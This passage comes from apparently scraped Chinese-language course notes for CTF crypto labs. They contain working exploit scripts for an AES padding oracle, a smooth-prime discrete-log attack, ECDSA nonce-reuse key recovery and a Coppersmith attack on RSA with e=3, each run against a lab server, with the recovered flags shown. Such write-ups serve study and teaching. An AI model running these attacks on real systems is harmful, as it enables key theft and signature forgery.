^ padding_idx]) return known_part def construct_payload_and_verify(i, known_part, enc_self_key, encrypted_key): # candidate = [] for byte in range(256): # 每一個byte要猜最多256次 # 自己控制 self_pt = b\u0026#39;\\x00\u0026#39; * (15-i) + bytes([byte]) + known_part log.info(f\u0026#34;self pt = {self_pt}\u0026#34;) _, self_ct = symmetric_encryption(self_pt, self_key, self_iv) # 連線oracle並驗證 r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(enc_self_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(encrypted_key).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, self_ct.hex().encode())#enc_png.hex().encode() res = r.recvline().decode().strip() # log.info(f\u0026#39;key = {enc_self_key}, iv = {encrypted_key}, ct = {self_ct.hex()}\u0026#39;) print(res) if res == \u0026#39;OK! Got it.\u0026#39;: tmp = hex(byte ^ (i+1))[2:] if len(tmp) \u0026lt; 2: tmp = \u0026#39;0\u0026#39; + tmp return tmp r.close() # 題目給的資訊 enc_png = open(\u0026#39;./Crypto/HW/Oracle/encrypted_flag_d6fbfd5306695c4a.not_png\u0026#39;, \u0026#39;rb\u0026#39;).read() N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223 e = 65537 encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 # 自己控制的資訊 self_iv = b\u0026#39;\\x00\u0026#39; * 16 self_key = b\u0026#39;\\x00\u0026#39; * 16 enc_self_key = asymmetric_encryption(self_key, N, e) # Try to POA Key real_key = \u0026#39;\u0026#39; for i in range(16): # iv共有16bytes known_part = compute_know_part(i+1, real_key) real_key = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_key) + real_key # Try to POA IV real_iv = \u0026#39;\u0026#39; for i in range(16): # iv共有16bytes known_part = compute_know_part(i+1, real_iv) real_iv = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_iv) + real_iv # Final Testing test_key = pow(int(real_key, 16), e, N) test_iv = pow(int(real_iv, 16), e, N) r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(test_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(test_iv).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, enc_png.hex().encode()) assert r.recvline().decode().strip() == \u0026#39;OK! Got it.\u0026#39; # Final Decrypt Flag Image # real_key = \u0026#39;49276d5f345f357472306e395f6b3379\u0026#39; # real_iv = \u0026#39;4ba3cb1c134651c3bb5cd6e381c2909b\u0026#39; real_iv = bytes.fromhex(real_iv) real_key = bytes.fromhex(real_key) cipher = AES.new(real_key, AES.MODE_CBC, real_iv) pt = unpad(cipher.decrypt(enc_png)) open(\u0026#34;./Crypto/HW/Oracle/decrypted_flag.png\u0026#34;, \u0026#34;wb\u0026#34;).write(pt) ::: :::spoiler 有考慮同一個byte多種可能的版本\nfrom pwn import * from Crypto.Util.number import long_to_bytes, bytes_to_long from Crypto.Cipher import AES from random import randbytes def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise ValueError return c[:-length] def asymmetric_encryption(message, N, e): # encrypt message with RSA # message must be 16 bytes # padding 100 bytes random value padded_message = b\u0026#39;\\x01\u0026#39; * 100 + message return pow(bytes_to_long(padded_message), e, N) def symmetric_encryption(message, key, iv): # ecrypt message with AES + CBC Mode # message can be arbitrary length cipher = AES.new(key, AES.MODE_CBC, iv) ct = cipher.encrypt(message) iv = cipher.iv return iv, ct def compute_know_part(padding_idx, known_key): if known_key == \u0026#39;\u0026#39;: return b\u0026#39;\u0026#39; known_part = b\u0026#39;\u0026#39; for i in range(len(known_key)//2): known_part += bytes([int(known_key[i*2:i*2+2], 16) ^ padding_idx]) return known_part def construct_payload_and_verify(i, known_part, enc_self_key, encrypted_key): candidate = [] for byte in range(256): # 每一個byte要猜最多256次 # 自己控制 self_pt = b\u0026#39;\\x00\u0026#39; * (15-i) + bytes([byte]) + known_part log.info(f\u0026#34;self pt = {self_pt}\u0026#34;) _, self_ct = symmetric_encryption(self_pt, self_key, self_iv) # 連線oracle並驗證 r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(enc_self_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(encrypted_key).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, self_ct.hex().encode())#enc_png.hex().encode() res = r.recvline().decode().strip() # log.info(f\u0026#39;key = {enc_self_key}, iv = {encrypted_key}, ct = {self_ct.hex()}\u0026#39;) print(res) if res == \u0026#39;OK! Got it.\u0026#39;: tmp = hex(byte ^ (i+1))[2:] if len(tmp) \u0026lt; 2: tmp = \u0026#39;0\u0026#39; + tmp candidate.append(tmp) r.close() if len(candidate) == 0: raise ValueError return candidate # 題目給的資訊 enc_png = open(\u0026#39;./Crypto/HW/Oracle/encrypted_flag_d6fbfd5306695c4a.not_png\u0026#39;, \u0026#39;rb\u0026#39;).read() N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223 e = 65537 encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 # 自己控制的資訊 self_iv = b\u0026#39;\\x00\u0026#39; * 16 self_key = b\u0026#39;\\x00\u0026#39; * 16 enc_self_key = asymmetric_encryption(self_key, N, e) # Try to POA Key i = 0 real_key = \u0026#39;\u0026#39; known_part = compute_know_part(i+1, real_key) candidate = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_key) i += 1 while(len(real_key) != 32): # iv共有16bytes for candidate_tmp in candidate: known_part = compute_know_part(i+1, candidate_tmp + real_key) try: candidate = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_key) i += 1 real_key = candidate_tmp + real_key break except: pass if len(real_key) == 30: real_key = candidate[0] + real_key break # Try to POA IV real_iv = \u0026#39;\u0026#39; i = 0 known_part = compute_know_part(i+1, real_iv) candidate = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_iv) i += 1 while(len(real_iv) != 32): # iv共有16bytes for candidate_tmp in candidate: known_part = compute_know_part(i+1, candidate_tmp + real_iv) try: candidate = construct_payload_and_verify(i, known_part, enc_self_key, encrypted_iv) i += 1 real_iv = candidate_tmp + real_iv break except: pass if len(real_iv) == 30: real_iv = candidate[0] + real_iv break # Final Testing test_key = pow(int(real_key, 16), e, N) test_iv = pow(int(real_iv, 16), e, N) r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(test_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(test_iv).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, enc_png.hex().encode()) assert r.recvline().decode().strip() == \u0026#39;OK! Got it.\u0026#39; # Final Decrypt Flag Image # real_key = \u0026#39;49276d5f345f357472306e395f6b3379\u0026#39; # real_iv = \u0026#39;4ba3cb1c134651c3bb5cd6e381c2909b\u0026#39; real_iv = bytes.fromhex(real_iv) real_key = bytes.fromhex(real_key) cipher = AES.new(real_key, AES.MODE_CBC, real_iv) pt = unpad(cipher.decrypt(enc_png)) open(\u0026#34;./Crypto/HW/Oracle/decrypted_flag.png\u0026#34;, \u0026#34;wb\u0026#34;).write(pt) :::\n:::spoiler Flag Flag: FLAG{Rea11yu5efu110rac1eisntit?} ::: SpeedUp的意思是只考慮一個byte只有一種可能的結果，換句話說，256種可能中只有唯一解，而另外一個script就考慮的比較全面了，有可能在256種結果中，有另外一種可能導致padding正確(雖然機率很低)\nReference # CTF - AES Padding Oracle\n"},{"id":368,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/","title":"Simple Crypto - 0x08(2023 Lab - dlog)","section":"Securities","content":" Simple Crypto - 0x08(2023 Lab - dlog) # Background # [edu-ctf 2023] week03 - crypto2 Cryptography and Network Security – Homework 2 - Little Knowledge Proof\nSource code # :::spoiler Source Code\nfrom Crypto.Util.number import isPrime, bytes_to_long import os from secret import FLAG p = int(input(\u0026#34;give me a prime: \u0026#34;).strip()) if not isPrime(p): print(\u0026#34;Do you know what is primes?\u0026#34;) exit(0) if p.bit_length() != 1024: print(\u0026#34;Bit length need to be 1024\u0026#34;) exit(0) g = int(input(\u0026#34;give me a number: \u0026#34;).strip()) flag = bytes_to_long(FLAG) print(\u0026#39;The hint about my secret:\u0026#39;, pow(g, flag, p)) :::\nRecon # 基本上這一題和上一個學期上的CNS中，作業二的Little Knowledge Proof概念一模一樣，當時還不知道這是啥騷操作，現在覺得非常簡單，就是套用了Pohlig-Hellman的原理進行破解\n首先看source code需要我們提供一個prime($N$)，然後跟一個不重要的底數$g$，接著題目return一個hint就是$hint=g^{flag}\\ mod(N)$，因此按照discrete log的難度，我們很難針對hint進行brute force，縱使我們知道N,g,hint也一樣，但因為N是我們提供的，所以我可以故意給他一個smooth prime，也就是$N-1$是由多個prime相乘而得 我們可以用上課教過的Pohlig-Hellman原理去思考，也就是先把群的範圍縮小，再利用BSGS的方法找到$x_i$，這時雖然得到$x_i$但由於是mod $p_i$的結果，就不是真正的$x$，要利用CRT把多個$x_i$還原成原本的$x$，幸虧以上操作sage都做好了 Exploit # 記得要進入conda中sage的環境，如果沒有的話可以直接創一個: conda create --name sageenv sage=10.0 -c conda-forge -y，然後可以直接python exp.py也可以直接sage exp.py，但重點是from sage.all import *是一定要加的，如果要像之前CNS那樣使用Pohlig-Hellman的函數，就一定要另外分開寫一個專門的script，因為他沒辦法相容pwntools的remote method，但可以相容local process，真的有點奇怪。另外sage也沒辦法接受log.info(f\u0026quot;...\u0026quot;)的語法，所以全部都要換成print\nfrom pwn import * from Crypto.Util.number import * from sage.all import * smooth_prime = 2 while True: bitLen = smooth_prime.bit_length() if bitLen \u0026gt; 1024: smooth_prime = 2 if bitLen == 1024: if isPrime(smooth_prime + 1): print(smooth_prime+1) smooth_prime = smooth_prime + 1 break smooth_prime *= getPrime(10) r = remote(\u0026#34;10.113.184.121\u0026#34;, 10032) # r = process([\u0026#34;python\u0026#34;, \u0026#34;dlog_bfc156b3a0eec196.py\u0026#34;]) g = 2 r.recvuntil(b\u0026#34;: \u0026#34;) r.sendline(str(smooth_prime).encode()) r.recvuntil(b\u0026#39;give me a number: \u0026#39;) r.sendline(str(g).encode()) r.recvuntil(b\u0026#39;The hint about my secret: \u0026#39;) hint = r.recvline() print(f\u0026#39;Smooth Prime is: {smooth_prime}\u0026#39;) print(\u0026#34;g = 2\u0026#34;) print(f\u0026#39;hint = {hint.decode().strip()}\u0026#39;) flag = discrete_log(Mod(hint, smooth_prime), Mod(g, smooth_prime)) print(f\u0026#34;Flag = {long_to_bytes(flag).decode()}\u0026#34;) r.close() "},{"id":369,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/","title":"Simple Crypto - 0x09(2023 Lab - signature)","section":"Securities","content":" Simple Crypto - 0x09(2023 Lab - signature) # Background # [edu-ctf 2023] week03 - crypto2 - ECDSA\nSource code # :::spoiler Source Code\nfrom random import randint from Crypto.Util.number import * from hashlib import sha256 from ecdsa import SECP256k1 from ecdsa.ecdsa import Public_key, Private_key, Signature from secret import FLAG E = SECP256k1 G, n = E.generator, E.order d = randint(1, n) k = randint(1, n) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) print(f\u0026#39;P = ({pubkey.point.x()}, {pubkey.point.y()})\u0026#39;) for _ in range(3): print(\u0026#39;\u0026#39;\u0026#39; 1) Request for Signature 2) Check the Permission 3) exit\u0026#39;\u0026#39;\u0026#39;) option = input() if option == \u0026#39;1\u0026#39;: msg = input(\u0026#39;What do you want? \u0026#39;) if msg == \u0026#39;Give me the FLAG.\u0026#39;: print(\u0026#39;No way!\u0026#39;) else: h = sha256(msg.encode()).digest() # k = k * 1337 % n sig = prikey.sign(bytes_to_long(h), k) print(f\u0026#39;sig = ({sig.r}, {sig.s})\u0026#39;) elif option == \u0026#39;2\u0026#39;: msg = \u0026#39;Give me the FLAG.\u0026#39; r = input(\u0026#39;r: \u0026#39;) s = input(\u0026#39;s: \u0026#39;) h = bytes_to_long(sha256(msg.encode()).digest()) verified = pubkey.verifies(h, Signature(int(r), int(s))) if verified: print(FLAG) else: print(\u0026#39;Bad signature\u0026#39;) else: print(\u0026#34;bye~\u0026#34;) break :::\nRecon # 這一題主要就是利用上課提到的nonce $k$不隨機的問題，因為$k$只能用一次，也就代表他需要夠隨機，如果像LCG這樣的psudo random generator產生的話，一但被compromise，就會被推導出private key $d$，而這個lab就是有這樣的問題\n觀察source code會發現不同的nonce $k$之間會產生一個1337倍數的關係，然後如果request Give me the FLAG.的signature會被拒絕，所以只能自己產生Give me the FLAG.的signature再丟給server檢查，如果過了就可以拿到flag，但重點是要怎麼偽造signature假裝是server簽的?就是要想辦法拿到server產生的private key $d$，可以詳細看一下source code中提到，通常public key都一樣，所以重點是$d$才能產生private key，然後用private key簽署message E = SECP256k1 G, n = E.generator, E.order d = randint(1, n) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) ↓ sig = prikey.sign(bytes_to_long(h), k) 已知(題目給的部分) 只要我們給兩次要簽章的message，總共可以得到以下資訊 $$ coordinate\\ (x_0,\\ y_0),\\ hash\\ H_1,\\ hash\\ H_2,\\ signature\\ (s_1,\\ r_1),\\ (s_2,\\ r_2) $$ 推導 假設$msg=b\u0026rsquo;a\u0026rsquo;$ $$ H_1 = H_2 = sha256(msg)\\ \\begin{aligned} k_1 \u0026amp;= {s_1}^{-1} \\cdot (H_1 + d\\cdot r_1)={s_1}^{-1} \\cdot H_1 + d\\cdot r_1 \\cdot {s_1}^{-1}\\ k_2 \u0026amp;= {s_2}^{-1} \\cdot (H_2 + d\\cdot r_2) = 1337\\times k_1=\\ \u0026amp;= {s_2}^{-1} \\cdot H_2 + {s_2}^{-1}\\cdot d\\cdot r_2\\ \u0026amp;= 1337 \\cdot {s_1}^{-1} \\cdot H_1 + 1337 \\cdot d\\cdot r_1 \\cdot {s_1}^{-1} \\end{aligned}\\ \\downarrow \\ d\\cdot (H_2\\cdot {s_2}^{-1} - 1337\\cdot H_1\\cdot {s_1}^{-1})=1337\\cdot r_1\\cdot {s_1}^{-1}-r_2\\cdot {s_2}^{-1}\\ \\hookrightarrow d = {1337\\cdot r_1\\cdot {s_1}^{-1}-r_2\\cdot {s_2}^{-1} \\over H_2\\cdot {s_2}^{-1} - 1337\\cdot H_1\\cdot {s_1}^{-1}} $$ 得到原本的private key $d$之後就可以直接選一個亂數nonce $k$，然後重新自己簽署Give me the FLAG.的signature Exploit # :::spoiler Whole Exploit\nfrom pwn import * from Crypto.Util.number import * from hashlib import sha256 from ecdsa import SECP256k1 from ecdsa.ecdsa import Public_key, Private_key, Signature # r = process([\u0026#34;python\u0026#34;, \u0026#34;./signature_416666d57b34123f.py\u0026#34;]) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10033) # Receive Some Info from Server msg = \u0026#39;a\u0026#39; E = SECP256k1 G, n = E.generator, E.order r.recvuntil(b\u0026#39;P = (\u0026#39;) x, y = r.recvline().decode().strip().rstrip(\u0026#39;)\u0026#39;).split(\u0026#39;, \u0026#39;) r.recvlines(3) r.sendline(b\u0026#39;1\u0026#39;) r.sendlineafter(b\u0026#39;What do you want?\u0026#39;, msg.encode()) r.recvuntil(b\u0026#39;sig = (\u0026#39;) r1, s1 = r.recvline().decode().strip().rstrip(\u0026#39;)\u0026#39;).split(\u0026#39;, \u0026#39;) r.recvlines(3) r.sendline(b\u0026#39;1\u0026#39;) r.sendlineafter(b\u0026#39;What do you want?\u0026#39;, msg.encode()) r.recvuntil(b\u0026#39;sig = (\u0026#39;) r2, s2 = r.recvline().decode().strip().rstrip(\u0026#39;)\u0026#39;).split(\u0026#39;, \u0026#39;) log.info(f\u0026#39;x = {x}\\ny = {y}\u0026#39;) log.info(f\u0026#39;r1 = {r1}\\ns1 = {s1}\u0026#39;) log.info(f\u0026#39;r2 = {r2}\\ns2 = {s2}\u0026#39;) # Calculte Private Key - d hash_msg = sha256(msg.encode()).digest() inv_s1 = inverse(int(s1), n) inv_s2 = inverse(int(s2), n) hash_msg_decimal = bytes_to_long(hash_msg) r1 = int(r1) r2 = int(r2) d = inverse(1337 * r1 * inv_s1 - r2 * inv_s2, n) * (hash_msg_decimal * inv_s2 - 1337 * hash_msg_decimal * inv_s1) k1 = inv_s1 * (hash_msg_decimal + d * r1) k2 = inv_s2 * (hash_msg_decimal + d * r2) assert k2 % n == k1 * 1337 % n # Forgery Signature \u0026amp; Send it k = randint(1, n) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) flag_msg = \u0026#39;Give me the FLAG.\u0026#39; flag_msg_h = sha256(flag_msg.encode()).digest() sig = prikey.sign(bytes_to_long(flag_msg_h), k) r.recvlines(3) r.sendline(b\u0026#39;2\u0026#39;) r.sendlineafter(b\u0026#39;r: \u0026#39;, sig.r.digits().encode()) r.sendlineafter(b\u0026#39;s: \u0026#39;, sig.s.digits().encode()) flag = r.recvline().strip().decode() log.info(f\u0026#39;Flag: {flag}\u0026#39;) r.close() ::: ```bash $ python exp.py [+] Opening connection to 10.113.184.121 on port 10033: Done [*] x = 80833128996081892656118221427167942614367970190999112028100047868271602908158 y = 7692760766381285656486680270900861598977131934640663688795645395086394523342 [*] r1 = 57205296794452689467192257573140114834242454684651993799259557149551452463654 s1 = 46076932900642565773729561332617152693574412598169577544559584675273278539735 [*] r2 = 32274988576741840972950688950377038880296385056439434547263507357520953909449 s2 = 38964710627625045025023640822136515580011444306594995093726779755542228691436 [*] Flag: b\u0026#39;FLAG{EphemeralKeyShouldBeRandom}\u0026#39; [*] Closed connection to 10.113.184.121 port 10033 Flag: FLAG{EphemeralKeyShouldBeRandom}\n"},{"id":370,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/","title":"Simple Crypto - 0x10(2023 Lab - coppersmith)","section":"Securities","content":" Simple Crypto - 0x10(2023 Lab - coppersmith) # Background # coppersmith相關攻擊\nSource code # :::spoiler Source Code\nfrom Crypto.Util.number import bytes_to_long, getPrime from secret import FLAG assert len(FLAG) \u0026lt;= 30 p = getPrime(1024) q = getPrime(1024) n = p * q e = 3 padding = b\u0026#34;Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm\u0026#39;s block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data\u0026#39;s size isn\u0026#39;t a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols.\u0026#34; pt = padding + FLAG ct = pow(bytes_to_long(pt), e, n) print(f\u0026#34;{e = }\u0026#34;) print(f\u0026#34;{n = }\u0026#34;) print(f\u0026#34;{ct = }\u0026#34;) # e = 3 # n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429 # ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608 :::\nRecon # 這一題看到e=3直覺會想到小明文攻擊，但是前提除了$e$要很小以外，明文也不能太大，要不然會找很久，他的原理是(假設e=3): $$ \\because C\\equiv m^3\\ mod\\ N\\ \\therefore m^3=C+k\\times N \\ ↪m=\\root 3 \\of {C+k\\times N} $$ 所以可以枚舉很多的k，並且依次開三次方，直到開出整數為止，但就像前面的前提，明文不能太大，不然也會找的很痛苦，此時就可以用到上課教到的coppersmith，解出這樣的問題\nReview Coppersmith Attack 問題：如果有一個${f(x)\\equiv 0\\ (mod\\ N)\\ |x=r, N\\in \\mathbb{Z}, f(x)\\in \\mathbb{Z}{[x]}}$，當$x=r$的時候會同餘$0$ 想求：$r$是多少能符合以上的式子\n首先這個問題因為mod是一個循環，所以正常情況下很難知道$r$多少能符合，因此我們可以簡化一下問題，或者說增加一些限制，這樣在尋找$r$的時候會比較好找一點\n首先構造一個 $$ {Q(x)=s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)\\ |\\ Q(r)\\equiv 0\\ (mod\\ N), r\\in \\mathbb{Z}} $$ 在這裡可以先把$r$帶進去這個構造的式子，就會發現其實跟一開始求的問題，也就是$f(x)\\equiv 0\\ (mod\\ N)$其實一樣，但為甚麼要這樣做呢?是因為把問題拉到實數域中求解後比較好做，等我們拿到$r$在實數域得到的root之後就可以帶回去$f(x)$中。\n我們可以把$r$想像成是一個flag，然後flag會有一個最大可能性的上界，也就是$R$，假設flag有32個字元，代表256個bits，我們可以想像$R=2^{256}$，我們不知道flag是多少，但一定在$R$的這個範圍中，且flag一定是整數(換算成int的話)\n所以我們就可以重新寫一個bounded equation $$ Q(r)=|Q_nr^n+\u0026hellip;+Q_2r^2+Q_1r^1+Q_0|\\le |Q_n|R^n+\u0026hellip;+|Q_2|R^2+|Q_1|R+|Q_0| $$ 有了這個bound equation後，我們就可以說 $$ \\because |Q(r)| \u0026lt; |Q(R)| \u0026lt; N且Q(r) ≡ 0\\ mod\\ N\\ \\therefore Q(r)=0 $$ 有了以上條件和說明，此時我們確定把問題拉到實數域上了，現在還不知到$r$為多少\n而要知道$r$就必須知道$Q(r)$，只要得到$Q(r)$再利用找root的sage method就可以直接得到$r$為多少，但在得到$Q(r)$之前我們要先得到$Q(R)$，我們可以利用前面提到的$s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)$建一個多項式，然後用matrix表示並把$R$帶入，再利用LLL求shortest vector，此時的shortest vector是以$x=R$為條件帶入，所以只要在各個term把$R$除掉，就可以得到$Q(r)$各個term的係數，然後就求得$r$為多少了，舉例來說：\n在RSA中，已知$c= m^e\\ (mod\\ N)$，當我們今天拿到一個有padding明文(當然我們拿到的是密文，只是知道明文有經過padding，且padding的部分我們知道，另外flag的大小也不能太大，具體能多大可以看影片)，且$e=3$，我們可以rewrite整個式子(假設padding的部分為$a$，flag的部分為$x$) $$ \\begin{aligned} m \u0026amp;= padding + flag\\ c \u0026amp;= m^3 = (padding + flag)^3\\ (mod\\ N)\\ f(x) \u0026amp;= (padding + flag)^3 - c\\ (mod\\ N) \\end{aligned}\\ \\downarrow\\ s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)\\ =c_3(x^3 + 3ax^2 + 3a^2x + (a^3 - c)) + (c_2x^2 + c_1x + c_0)\\cdot N\\ =\\begin{bmatrix} c_3, c_2, c_1, c_0 \\end{bmatrix}\\cdot\\begin{bmatrix} x^3 \u0026amp; 3ax^2 \u0026amp; 3a^2x \u0026amp; a^3 - c\\ 0 \u0026amp; Nx^2 \u0026amp; 0 \u0026amp; 0 \\ 0 \u0026amp; 0 \u0026amp; Nx \u0026amp; 0\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; N \\end{bmatrix} $$ $s(x)=c_3$，如果把$f(x)$乘開就會是$x^3 + 3ax^2 + 3a^2x + (a^3 - c)$，而$t(x)=c_2x^2 + c_1x + c_0$。此時把矩陣的$x$帶入上界$R$再利用LLL求shortest vector，也就是 $$ \\begin{bmatrix} c_3R^3\\ (c_33a + c_2N)*R^2\\ (c_33a^2 + c_1N)*R\\ (c_3(a^3-c) + c_0N) \\end{bmatrix}^T $$ 詳細過程如下: $$ \\begin{aligned} M\u0026amp;=\\begin{bmatrix} R^3 \u0026amp; 3aR^2 \u0026amp; 3a^2R \u0026amp; a^3 - c\\ 0 \u0026amp; NR^2 \u0026amp; 0 \u0026amp; 0 \\ 0 \u0026amp; 0 \u0026amp; NR \u0026amp; 0\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; N\\ \\end{bmatrix} | x = R\\ LLL(M)\u0026amp;=\\begin{bmatrix} c_3R^3\\ (c_33a + c_2N)*R^2\\ (c_33a^2 + c_1N)*R\\ (c_3(a^3-c) + c_0N) \\end{bmatrix}^T \\end{aligned}\\ ↪Q(x)=\\begin{bmatrix} c_3\\ c_33a + c_2N\\ c_33a^2 + c_1N\\ c_3(a^3-c) + c_0N \\end{bmatrix}^T\\begin{bmatrix} x^3\\ x^2\\ x^1\\ x^0 \\end{bmatrix}\\le Q(R) = \\begin{bmatrix} Q_3\\ Q_2\\ Q_1\\ Q_0 \\end{bmatrix}^T \\begin{bmatrix} R^3\\ R^2\\ R\\ 1\\ \\end{bmatrix}\\le N $$\n求flag(也就是求得$Q(x)$的root $x_0$) 由以上過程，我們已經取得了$Q(x)$，則我們就可以在實數域中求$Q(x)$的根$x_0$\n基本上這一題就是按照上面講的這樣解就可以了\nExploit # from Crypto.Util.number import * from pwn import log e = 3 n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429 ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608 l = 30 R = 1 \u0026lt;\u0026lt; (l * 8) padding = b\u0026#34;Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm\u0026#39;s block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data\u0026#39;s size isn\u0026#39;t a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols.\u0026#34; a = bytes_to_long(padding) * (R) M = [ [R^3, 3 * a * R^2, 3 * a^2 * R, a^3 - ct], [0, n * R^2, 0, 0], [0, 0, n * R, 0], [0, 0, 0, n] ] L = matrix(M).LLL() v = L[0] F.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) Q = (v[0] // R^3) * x^3 + (v[1] // R^2) * x^2 + (v[2] // R) * x + v[3] # print(Q.roots()) v = L[0] F.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) Q = (v[0] // R^3) * x^3 + (v[1] // R^2) * x^2 + (v[2] // R) * x + v[3] # print(Q.roots()[0][0]) log.info(f\u0026#39;Flag: {long_to_bytes(Q.roots()[0][0]).decode()}\u0026#39;) Flag: FLAG{RandomPaddingIsImportant}\n"},{"id":371,"href":"/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/","title":"Simple Crypto 0x11(2023 HW - invalid_curve_attack)","section":"Securities","content":" Simple Crypto 0x11(2023 HW - invalid_curve_attack) # Background # pekobot - maple\n這邊我會嘗試用簡單的講法把這個攻擊簡述一遍，詳細還是建議 Crypton 或是其他地方的說明。\nInvalid Curve Attack 大致上來說利用的是當一個不在原本曲線 $E$ 上的 $P$ 進行 scalar multiplication 的一些特性，使用類似 Pohlig–Hellman algorithm 的辦法在不同的 subgroup 解 DLP 然後用 CRT 解回原本的 private key。\n一個 Short Weierstrass curve 長這樣:\n$$ y^2 = x^3 + ax + b $$\n而它的 point doubling formula ($R=2P$) 是:\n$$ \\begin{aligned} s \u0026amp;= \\frac{3x_P^2+a}{2y_P} \\ x_R \u0026amp;= s^2 - 2x_P \\ y_R \u0026amp;= y_P + s(x_R - x_P) \\end{aligned} $$\n由此可見一個 Short Weierstrass curve 在做 scalar multiplication 時並沒有使用到 $b$， 